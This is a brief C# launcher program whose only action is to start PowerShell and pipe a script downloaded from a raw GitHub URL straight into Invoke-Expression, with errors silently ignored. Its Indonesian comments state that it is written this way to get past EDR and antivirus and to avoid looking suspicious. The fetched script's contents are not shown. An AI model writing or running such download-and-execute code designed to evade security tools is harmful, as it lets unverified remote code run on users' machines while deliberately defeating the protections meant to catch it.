using System;
using System.Diagnostics;

namespace WinSiRiadyLauncher
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            try
            {
                // Eksekusi sesederhana mungkin agar lolos EDR / Antivirus
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "powershell.exe";
                psi.Arguments = "-Command \"irm https://raw.githubusercontent.com/riadysandi/WinSiRiady/master/WinSiRiady.ps1 | iex\"";
                
                // Jangan gunakan WindowStyle Hidden atau Bypass agar tidak mencurigakan
                psi.UseShellExecute = true;

                Process.Start(psi);
            }
            catch (Exception ex)
            {
                // Abaikan jika error
            }
        }
    }
}
